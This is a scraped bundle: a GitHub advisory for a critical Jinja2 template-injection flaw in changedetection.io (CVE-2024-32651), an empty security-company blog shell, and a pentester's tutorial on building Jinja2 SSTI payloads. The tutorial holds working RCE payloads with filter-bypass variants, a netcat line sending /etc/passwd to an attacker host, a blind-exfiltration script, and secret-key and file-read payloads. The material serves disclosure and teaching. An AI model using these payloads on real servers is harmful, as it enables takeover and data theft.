=== Content from github.com_028b4821_20250111_030604.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdgtlmoon%2Fchangedetection.io%2Fsecurity%2Fadvisories%2FGHSA-4r7v-whpg-8rx3)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdgtlmoon%2Fchangedetection.io%2Fsecurity%2Fadvisories%2FGHSA-4r7v-whpg-8rx3)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=dgtlmoon%2Fchangedetection.io)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[dgtlmoon](/dgtlmoon)
/
**[changedetection.io](/dgtlmoon/changedetection.io)**
Public

* [Notifications](/login?return_to=%2Fdgtlmoon%2Fchangedetection.io) You must be signed in to change notification settings
* [Fork
  1.1k](/login?return_to=%2Fdgtlmoon%2Fchangedetection.io)
* [Star
   21k](/login?return_to=%2Fdgtlmoon%2Fchangedetection.io)

* [Code](/dgtlmoon/changedetection.io)
* [Issues
  223](/dgtlmoon/changedetection.io/issues)
* [Pull requests
  36](/dgtlmoon/changedetection.io/pulls)
* [Discussions](/dgtlmoon/changedetection.io/discussions)
* [Actions](/dgtlmoon/changedetection.io/actions)
* [Projects
  0](/dgtlmoon/changedetection.io/projects)
* [Wiki](/dgtlmoon/changedetection.io/wiki)
* [Security](/dgtlmoon/changedetection.io/security)
* [Insights](/dgtlmoon/changedetection.io/pulse)

Additional navigation options

* [Code](/dgtlmoon/changedetection.io)
* [Issues](/dgtlmoon/changedetection.io/issues)
* [Pull requests](/dgtlmoon/changedetection.io/pulls)
* [Discussions](/dgtlmoon/changedetection.io/discussions)
* [Actions](/dgtlmoon/changedetection.io/actions)
* [Projects](/dgtlmoon/changedetection.io/projects)
* [Wiki](/dgtlmoon/changedetection.io/wiki)
* [Security](/dgtlmoon/changedetection.io/security)
* [Insights](/dgtlmoon/changedetection.io/pulse)

# Server Side Template Injection in Jinja2 allows Remote Command Execution

Critical

[dgtlmoon](/dgtlmoon)
published
GHSA-4r7v-whpg-8rx3
Apr 25, 2024

## Package

pip

changedetection.io
([pip](/advisories?query=ecosystem%3Apip))

## Affected versions

<= 0.45.20

## Patched versions

0.45.21

## Description

### Summary

A Server Side Template Injection in changedetection.io caused by usage of unsafe functions of Jinja2 allows Remote Command Execution on the server host.

### Details

changedetection.io version: 0.45.20

```
docker images
REPOSITORY                            TAG       IMAGE ID       CREATED        SIZE
dgtlmoon/changedetection.io           latest    53529c2e69f1   44 hours ago   423MB

```

The vulnerability is caused by the usage of vulnerable functions of Jinja2 template engine.

```
from jinja2 import Environment, BaseLoader
...
    # Get the notification body from datastore
    jinja2_env = Environment(loader=BaseLoader)
    n_body = jinja2_env.from_string(n_object.get('notification_body', '')).render(**notification_parameters)
    n_title = jinja2_env.from_string(n_object.get('notification_title', '')).render(**notification_parameters)
```
### PoC

1. Create/Edit a URL watch item
2. Under *Notifications* tab insert this payload:

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

[![Screenshot from 2024-04-19 15-46-04](https://private-user-images.githubusercontent.com/35783570/323981584-b6a5779f-fd1e-4708-9b2d-21cb97f0bb4f.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NjUwNjQsIm5iZiI6MTczNjU2NDc2NCwicGF0aCI6Ii8zNTc4MzU3MC8zMjM5ODE1ODQtYjZhNTc3OWYtZmQxZS00NzA4LTliMmQtMjFjYjk3ZjBiYjRmLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDAzMDYwNFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWUzZWRmNTI4NGU0ZmIyMGU4OGRmMmY0Nzg2YzI1ZWM0NmM0YmRiYzhlZjU2ZjdlN2QzMmQ2OGIwM2MxNjlhMjEmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.3CzFx20IDnT176_YaM2WG6qCXTQtseGmOfDM0dh96xk)](https://private-user-images.githubusercontent.com/35783570/323981584-b6a5779f-fd1e-4708-9b2d-21cb97f0bb4f.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NjUwNjQsIm5iZiI6MTczNjU2NDc2NCwicGF0aCI6Ii8zNTc4MzU3MC8zMjM5ODE1ODQtYjZhNTc3OWYtZmQxZS00NzA4LTliMmQtMjFjYjk3ZjBiYjRmLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDAzMDYwNFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWUzZWRmNTI4NGU0ZmIyMGU4OGRmMmY0Nzg2YzI1ZWM0NmM0YmRiYzhlZjU2ZjdlN2QzMmQ2OGIwM2MxNjlhMjEmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.3CzFx20IDnT176_YaM2WG6qCXTQtseGmOfDM0dh96xk)

3. See Telegram (or other supported messaging app) notification

[![Screenshot from 2024-04-19 16-02-12](https://private-user-images.githubusercontent.com/35783570/323986418-20877919-d6fe-49f1-bbd2-586e900207f1.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NjUwNjQsIm5iZiI6MTczNjU2NDc2NCwicGF0aCI6Ii8zNTc4MzU3MC8zMjM5ODY0MTgtMjA4Nzc5MTktZDZmZS00OWYxLWJiZDItNTg2ZTkwMDIwN2YxLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDAzMDYwNFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWZiOTU1YTI4NTMyNDRhM2UwNThiOGI0NTViZjkxZTRhYjMyZDljMDJjODJjNzc5Y2RiZTgwNzhmMzU3YWVlZGMmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.ZUDa74PWKwLEm1JjFTpBh29cY83Rc0HWHtYvecFES4I)](https://private-user-images.githubusercontent.com/35783570/323986418-20877919-d6fe-49f1-bbd2-586e900207f1.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY1NjUwNjQsIm5iZiI6MTczNjU2NDc2NCwicGF0aCI6Ii8zNTc4MzU3MC8zMjM5ODY0MTgtMjA4Nzc5MTktZDZmZS00OWYxLWJiZDItNTg2ZTkwMDIwN2YxLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDAzMDYwNFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWZiOTU1YTI4NTMyNDRhM2UwNThiOGI0NTViZjkxZTRhYjMyZDljMDJjODJjNzc5Y2RiZTgwNzhmMzU3YWVlZGMmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.ZUDa74PWKwLEm1JjFTpBh29cY83Rc0HWHtYvecFES4I)

### Impact

In the PoC I've used `id` as payload and Telegram to read the result.

Attackers can run any system command without any restriction and they don't need to read the result in the notification app (e.g. they could use a reverse shell).

The impact is critical as the attacker can completely takeover the server host.

This can be reduced if changedetection access is protected by login page with a password, but this isn't required by the application (not by default and not enforced).

### References

* <https://blog.hacktivesecurity.com/index.php/2024/05/08/cve-2024-32651-server-side-template-injection-changedetection-io/>
* <https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti>
* <https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/>
* <https://docs.cobalt.io/bestpractices/prevent-ssti/>

### Credits

Edoardo Ottavianelli

### Severity

Critical

10.0

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Network

Attack complexity
Low

Privileges required
None

User interaction
None

Scope
Changed

Confidentiality
High

Integrity
High

Availability
High

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H

### CVE ID

CVE-2024-32651

### Weaknesses

[CWE-1336](/advisories?query=cwe%3A1336)

### Credits

* [![@edoardottt](https://avatars.githubusercontent.com/u/35783570?s=40&v=4)](/edoardottt)
  [edoardottt](/edoardottt)
  Finder
* [![@dgtlmoon](https://avatars.githubusercontent.com/u/275001?s=40&v=4)](/dgtlmoon)
  [dgtlmoon](/dgtlmoon)
  Remediation developer

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from blog.hacktivesecurity.com_4a02cae6_20250111_030603.html ===


[Twitter](https://x.com/hacktivesec)

[Facebook-f](https://www.facebook.com/hacktivesec)

[Linkedin-in](https://www.linkedin.com/company/hacktive-security/)

[Instagram](https://www.instagram.com/hacktivesec/)

[Youtube](https://www.youtube.com/channel/UC_80sidNQm0ACDpR53rDTlQ)

* +39-06-8773-8747
* info@hacktivesecurity.com

[![Hacktive Security](https://www.hacktivesecurity.com/wp-content/uploads/2024/10/logo_hs-1.png)](https://www.hacktivesecurity.com/)

* [Home](https://www.hacktivesecurity.com/)
* [About Us](https://www.hacktivesecurity.com/about-us/)
* Services
  + [Penetration Testing](https://www.hacktivesecurity.com/penetration-testing/)
  + [Red Teaming](https://www.hacktivesecurity.com/red-teaming/)
  + [Secure Code Review](https://www.hacktivesecurity.com/secure-code-review/)
  + [Training](https://www.hacktivesecurity.com/training/)
  + [Compliance](https://www.hacktivesecurity.com/compliance/)
* [Blog](https://www.hacktivesecurity.com/blog/)
* [Careers](https://www.hacktivesecurity.com/careers/)
* [Contacts](https://www.hacktivesecurity.com/contacts/)

Search for:

[![Hacktive Security](https://www.hacktivesecurity.com/wp-content/uploads/2024/10/logo_hs-1.png)](https://www.hacktivesecurity.com/)

Search for:

* [Home](https://www.hacktivesecurity.com/)
* [About Us](https://www.hacktivesecurity.com/about-us/)
* Services
  + [Penetration Testing](https://www.hacktivesecurity.com/penetration-testing/)
  + [Red Teaming](https://www.hacktivesecurity.com/red-teaming/)
  + [Secure Code Review](https://www.hacktivesecurity.com/secure-code-review/)
  + [Training](https://www.hacktivesecurity.com/training/)
  + [Compliance](https://www.hacktivesecurity.com/compliance/)
* [Blog](https://www.hacktivesecurity.com/blog/)
* [Careers](https://www.hacktivesecurity.com/careers/)
* [Contacts](https://www.hacktivesecurity.com/contacts/)

[![Hacktive Security](http://176.31.202.211/wp-content/uploads/2024/10/logo_hs-1.png)](https://www.hacktivesecurity.com/)

Over 10 years we help companies reach their financial and branding goals. Engitech is a values-driven technology agency dedicated.

#### Gallery

[![](https://www.hacktivesecurity.com/wp-content/uploads/2019/11/project11-720x720.jpg)](https://www.hacktivesecurity.com/wp-content/uploads/2019/11/project11.jpg)
[![](https://www.hacktivesecurity.com/wp-content/uploads/2019/11/project10-720x720.jpg)](https://www.hacktivesecurity.com/wp-content/uploads/2019/11/project10.jpg)
[![](https://www.hacktivesecurity.com/wp-content/uploads/2019/11/project4-720x720.jpg)](https://www.hacktivesecurity.com/wp-content/uploads/2019/11/project4.jpg)
[![](https://www.hacktivesecurity.com/wp-content/uploads/2019/11/project6-720x720.jpg)](https://www.hacktivesecurity.com/wp-content/uploads/2019/11/project6.jpg)
[![](https://www.hacktivesecurity.com/wp-content/uploads/2019/11/project2-720x720.jpg)](https://www.hacktivesecurity.com/wp-content/uploads/2019/11/project2.jpg)
[![](https://www.hacktivesecurity.com/wp-content/uploads/2019/11/project1-720x720.jpg)](https://www.hacktivesecurity.com/wp-content/uploads/2019/11/project1.jpg)

#### Contacts

Via Giosuè Carducci, 21 - Pomigliano d'Arco (Italy)
Paseo Montjuic, número 30 - Barcelona (Spain)

info@hacktivesecurity.com

+39 06 8773 8747

[Twitter](#hacktivesec)

Facebook-f

Pinterest-p

Instagram

Registration has been disabled.

![](https://www.hacktivesecurity.com/wp-content/uploads/2019/12/logo_hs-300x71.png)

Via Giosuè Carducci, 21

###### Our Addresses

info@hacktivesecurity.com

###### Our Mailbox

+39 06-8773-8747

###### Our Phone

* [Home](https://www2.hacktivesecurity.com)
* [About Us](https://www.hacktivesecurity.com/about-us/)
* [Blog](https://www.hacktivesecurity.com/blog/)
* Contacts
* [Privacy](https://www.hacktivesecurity.com/privacy/)
* [Security Policy](https://www.hacktivesecurity.com/security-policy/)

Copyright © 2024 Hacktive Security. All Rights Reserved.

[Twitter](https://x.com/hacktivesec)

[Facebook-f](https://www.facebook.com/hacktivesec)

[Linkedin-in](https://www.linkedin.com/company/hacktive-security/)

[Instagram](https://www.instagram.com/hacktivesec/)

[Youtube](https://www.youtube.com/channel/UC_80sidNQm0ACDpR53rDTlQ)



=== Content from www.onsecurity.io_501e3687_20250111_030605.html ===


* [Pentest](/blog/server-side-template-injection-with-jinja2/)
  + [OverviewOur approach to pentesting](/penetration-testing/)
  + [Instant QuotepopularThe only online pentest quoter](/penetration-test-quote/)
  + [Web ApplicationWeb apps, web servers & websites](/web-application-testing/)
  + [Mobile ApplicationiOS, Android and other apps](/mobile-application-testing/)
  + [Cloud SecurityAWS, Azure and GCP testing](/cloud-security-testing/)
  + [External InfrastructurePerimeter defence testing](/external-infrastructure-testing/)
  + [Internal InfrastructureInternal network & insider threats](/internal-infrastructure-testing/)
  + [Phishing SimulationPhishing testing & awareness](/phishing-simulation/)
  + [Social EngineeringIn-depth, highly-targeted phishing](/social-engineering/)
  + [Physical PenetrationOnsite security assessment](/physical-penetration-testing/)
* [Product](/blog/server-side-template-injection-with-jinja2/)
  + [ScanContinuous vulnerability scanning](/scan/)
  + ---
  + [RadarThreat intelligence & attack surface monitoring](/radar/)
* [Resources](/blog/server-side-template-injection-with-jinja2/)
  + [AboutFind Out More about OnSecurity](/about/)
  + [Cloud Security HubAll you need to know about Cloud Security](/learn/cloud-security/)
  + [Penetration Testing HubAll you need to know about Penetration Testing](/learn/penetration-testing/)
  + [BlogLearn More about Cyber Security](/blog/)
  + [Common File Text Search Streamline Icon: https://streamlinehq.comcommon-file-text-searchCase StudiesBrowse through our case studies](/blog/?category=case-studies)
  + [ContactGet in touch or book a call](/contact/)
* [Pricing](/pricing/)
[Log in](https://app.onsecurity.io/login)Try for free[Back](/)PentestProductResourcesPricingTry for free[Log in](https://app.onsecurity.io/login)[Blog Home](/blog/)>[Vulnerabilities & Hacking](/blog/?category=vulnerabilities-and-hacking)
# Server Side Template Injection with Jinja2 for you

Join Gus on a deep dive into crafting Jinja2 SSTI payloads from scratch. Explore bypass methods and various exploitation techniques in this insightful post.

Get an instant pentest quote now![](data:image/svg+xml;charset=utf-8...)![Gus Ralph](/static/2c731de7b77cce43527c3adf20e97bf4/4817d/gus.png)![Gus Ralph](/static/2c731de7b77cce43527c3adf20e97bf4/4817d/gus.png)Gus RalphPenetration TesterApril 29, 2020
## What is a SSTI?

A server side template injection is a vulnerability that occurs when a server renders user input as a template of some sort. Templates can be used when only minor details of a page need to change from circumstance to circumstance. For example, depending on the IP that accesses a site, the site may look like:

```
<h1>Welcome to the page!</h1>
<u>This page is being accessed from the remote address: {{ip}}</u>

```

Instead of creating a whole new page per person that accesses the site, it will simply render the remote address into the `{{ip}}` variable, while reusing the rest of the HTML for each person request the server receives to that endpoint.

This can be abused, since some template engines support some fairly complex functionality, that eventually allow for developers to run commands or file contents straight from the template.

So when the power to create and render templates is given to a user, it can lead to full access to the system, as the user running the webserver.

## What is 'MRO'?

Method Resolution Order (MRO) is the order in which Python looks for a method in a hierarchy of classes. It plays a vital role in the context of multiple inheritance as single method may be found in multiple super classes.

```
class A:
    def process(self):
        print('A process()')

class B:
    def process(self):
        print('B process()')

class C(A, B):
    def process(self):
        print('C process()')

class D(C,B):
    pass

obj = D()
obj.process()

print(D.mro())

```

This script will output the following:
`[<class '__main__.D'>, <class '__main__.C'>, <class '__main__.A'>, <class '__main__.B'>, <class 'object'>]`

So we can use the MRO function to display classes, will come in extremely handy for building python SSTI Jinja2 payloads.
If you dislike using the `global_name.__class__.__mro__` format, you can also make use of `__base__`. For example: `global_name.__class__.__base__`.

Since MRO will list the order in which the hierarchy of classes will be handled, we can take advantage of the fact that it lists the classes, to select the one we want. On the other hand, with base, we will not get this opportunity, but it also means we can discard the use of the `[1]`, that is used to select the object class in this payload for example: `{{g.__class__.__mro__}}` OR `{{g.__class__.mro()}}` OR `{{g['__class__']['mro']()}}` OR `{{g['__class__']['__mro__']}}`.

Essentially, `{{g.__class__.__mro__[1]}}` == `{{g.__class__.__base__}}`.

## Simple testing example arena

Place following in app.py, then run `python app.py`

```
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route("/")
def home():
    if request.args.get('c'):
        return render_template_string(request.args.get('c'))
    else:
        return "Bienvenue!"

if __name__ == "__main__":
    app.run(debug=True)

```
### Installation

```
sudo apt-get install python-pip
pip install flask --user
python app.py

```
## Playtime

This section is purely made up of things I have found while playing with the basic SSTI playground that is attached above. It also includes some methods that can be used to clean up, shorten, decrease character variety, or make the payloads more comfortable to use.

### RCE bypassing as much as I possibly can.

I initially built the following payload for remote command execution, and will now try and apply as many filter bypasses as I can.
`{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`

If the waf blocks ".":
`{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']()}}`

If the waf blocks "." and "\_":
`{{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('id')['read']()}}`

Bypassing the blocks on ".", "\_", "[]" and "|join" makes the payload turn into this payload I made for PayloadAllTheThings (<https://github.com/swisskyrepo/PayloadsAllTheThings/pull/181/commits/7e7f5e762831266b22531c258d628172c7038bb9>), also found on my twitter (<https://twitter.com/SecGus/status/1249744031392940033>):
`{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}`

### RCE without using {{}}.

Since we know how to build RCE SSTI payloads for Jinja2 now, we notice that one thing seems to repeat itself throughout every payload. The open and close tags for the template (`{{}}`), so surely, if we block these tags from user input, we are safe?

`{{}}` is not the only way to define the start of a template, if you are familiar with development in Jinja2 templates, you will know there are another two ways.

One of the methods mentioned in the documentation is via the use of hashtags:

```
Since Jinja 2.2, line-based comments are available as well. For example, if the line-comment prefix is configured to be ##, everything from ## to the end of the line is ignored (excluding the newline sign):

# for i in request.args:
    <li>{{ i }}</li>
# endfor

```

The reason this was not looked into as much as the other method is due to it needing an explicit option being enabled on the app. Which happens to be the `line_statement_prefix` option that can be found documented [here](https://jinja.palletsprojects.com/en/2.11.x/api/#jinja2.Environment) (thank you [makelaris](https://twitter.com/makelariss) for clarifying this for me).

The other method I know of to make the "render\_template\_string()" function detect the start and end of a template is by using `{% %}`.

These are generally used for iterations or conditionals, such as "for" or "if" statements. Then I had an idea, surely to make a comparison between the output of a function and a string, it needs to run the function? Maybe we can call the function in one of the comparison's parameters, which will allow us to run a command?

For this I made a simple if statement that can return True or False, regardless.
`{% if 'chiv' == 'chiv' %} a {% endif %}`

Now, if we start messing with the parameters, how about we put my RCE payload (`request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']()`) into one of the comparison values. Surely the server needs to run the function if it wants to compare their outputs?
`{% if request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('whoami')['read']() == 'chiv\n' %} a {% endif %}`

By using a similar methodology to blind SQL injections, we can verify if the command is run with the "sleep" command. Let's make the server sleep for 5 seconds.
`{% if request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('sleep 5')['read']() == 'chiv' %} a {% endif %}`

Bingo! The server response time is increased and delayed. We seem to have command execution, but no way of exfiltrating data (you could take advantage of the fact that it is a binary comparison, either returning True or False, to leak command input byte by byte, but we have a VPS, so we can use HTTP to exfiltrate data).

`{% if request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('cat /etc/passwd | nc HOSTNAME 1337')['read']() == 'chiv' %} a {% endif %}`

![RCE](/static/7b85ce653b440d33169343007544a930/351b3/rce.webp)

For this part of the blog, if you want a bit of a challenge based on blind output exfiltration, I recommend you try and produce a payload that allows you to exfiltrate command output via the binary if statement. The way I would personally do this would be by making use of the ord() function on each character of the output, and the gt or lt operator to help indicate what the selected output letter is.

```
import requests, time, string

dictionary = string.printable
URL = "http://localhost:5000/"
final = ""
command = raw_input('What command should I run?\n')

while True:
        for x in dictionary:
                x = final + x
                r = requests.get(url = URL + "/?c={% if request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('" + command + "')['read']().startswith('" + str(x) + "') %}yes{% endif %}")
                if 'yes' in r.text:
                        final = x
                        print "Command output: " + final
                        break
                else:
                        pass

```

Which will eventually leak the output of the inputted command, in my I ran "id", and got the following output: <https://twitter.com/SecGus/status/1250415032476860416>

### Leak the secret key used to sign session cookies.

By calling the config object, it returns a list of key value pairs, one being the secret key used to sign user cookies. So we can specify the `SECRET_KEY`, name pair and it will return the secret key value.
`{{config["SECRET_KEY"]}}`

If the "config" object is blocked or "config" is blacklisted then you can also use the self object, although you will have to CTRL+F for the 'SECRET\_KEY':
`{{self.__dict__}}`

### Bypass the |join filter, using format string.

This is python! Flexibility and simplicity should always be kept in mind. For this reason, we can use an extremely useful feature that comes as a filter for the flask templates: the format string feature.

An exemplar payload would be the following:
`{{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_`

This basically tells the template to use the request object, and then builds the attribute we want to request from the request object (\_\_class\_\_) using arguments that are passed outside of the GET parameter that will be checked by the waf.

So as a base, we have:
`{{request|attr(request.args.f)}}&f=%s%sclass%s%s`
Which would be the equivalent of `{{request|attr('%s%sclass%s%s')}}`. We then pipe it to the format filter, as so:
`{{request|attr('%s%sclass%s%s'|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&a=_`

This tells python to replace any "%s" with its according character. We pass it the value stored in the GET parameter called "a", which happens to be "\_".

Summary explanation:

1. `{{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_`
2. `{{request|attr('%s%sclass%s%s'|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&a=_`
3. `{{request|attr('%s%sclass%s%s'|format('_','_','_','_'))}}&a=_`
4. `{{request|attr('__class__'}}`

### Listing all classes & types through template.

This makes use of the class attribute along with python's method resolution order and the subclasses function to list all subclasses.
`{{OBJECT.__class__.mro().__subclasses__()}}`
`{{OBJECT.__class__.__mro__[1].__subclasses__()}}`
`{{OBJECT.__class__.__base__.__subclasses__()}}`
Where OBJECT can be a variety of things, for example:

* g
* request
* get\_flashed\_messages
* url\_for
* config
* application

### Payload development from 0

For any kind of payload development, you need to start by deciding what you want your main goal to be. We are going to go choose the initial object "get\_flashed\_messages" to work on.

We can start by confirming the function exists:
`{{get_flashed_messages}}`
We get `<function get_flashed_messages at 0x7f0932ca15d0>` back from the webserver, confirming it was recognised as a function being rendered as a template by the webserver. This is also a good way to confirm SSTI's, you can simply type `{{g}}` and the template should render as: `<flask.g of 'PYTHON APP NAME'>`.

Next, we can use the \_\_class\_\_ attribute to along with the \_\_mro\_\_ and subclasses function to list all classes within the app.

Final evolution:

1. `{{get_flashed_messages}}`
2. `{{get_flashed_messages.__class__}}`
3. `{{get_flashed_messages.__class__.__mro__}}`
4. `{{get_flashed_messages.__class__.__mro__[1]}}`
5. `{{get_flashed_messages.__class__.__mro__[1].__subclasses__()}}`
6. `{{get_flashed_messages.__class__.__mro__[1].__subclasses__()[40]}}`
7. `{{get_flashed_messages.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd')}}`
8. `{{get_flashed_messages.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}`

### Python Literal Hex Encoding

#### Usage

This literal encoding will only work in quoted strings. This means that if a WAF blocks characters that are only common in filenames, or commands, and not in the SSTI payload itself, you can use these to encode the string and bypass the WAF. For example, if `/` was blocked, you could substitute it for a `\x2F`.

#### Examples

URL:
`http://127.0.0.1:5000/?c={{``%22\x41%22}}`
Returns:
`A`

